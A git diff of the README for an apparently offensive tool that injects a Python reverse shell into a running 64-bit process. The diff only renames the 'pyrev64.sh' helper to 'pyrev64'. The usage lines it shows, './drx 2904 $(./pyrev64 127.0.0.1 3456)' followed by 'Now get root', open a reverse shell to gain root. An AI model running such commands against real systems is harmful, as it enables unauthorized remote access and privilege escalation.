@@ -59,15 +59,15 @@ Based from: https://github.com/David-Reguera-Garcia-Dreg/python_reverse_shell_de
 
 Steps for **64 bit process**:
 
-#### Using pyrev64.sh script way
+#### Using pyrev64 script way
 
-Just execute **./drx PID $(./pyrev64.sh IP PORT)**
+Just execute **./drx PID $(./pyrev64 IP PORT)**
 
 **WARNING: Only is valid a range port from 1000 to 9999 (no 89, no 10003 ...)**
 
 Example PID 2904, IP 127.0.0.1, PORT 3456
 ```
-./drx 2904 $(./pyrev64.sh 127.0.0.1 3456)
+./drx 2904 $(./pyrev64 127.0.0.1 3456)
 ```
 
 Now get root
@@ -154,4 +154,4 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 # Contributors
-* micronn: pyrev64.sh - https://github.com/micronn https://twitter.com/micronn386
+* micronn: pyrev64 - https://github.com/micronn https://twitter.com/micronn386
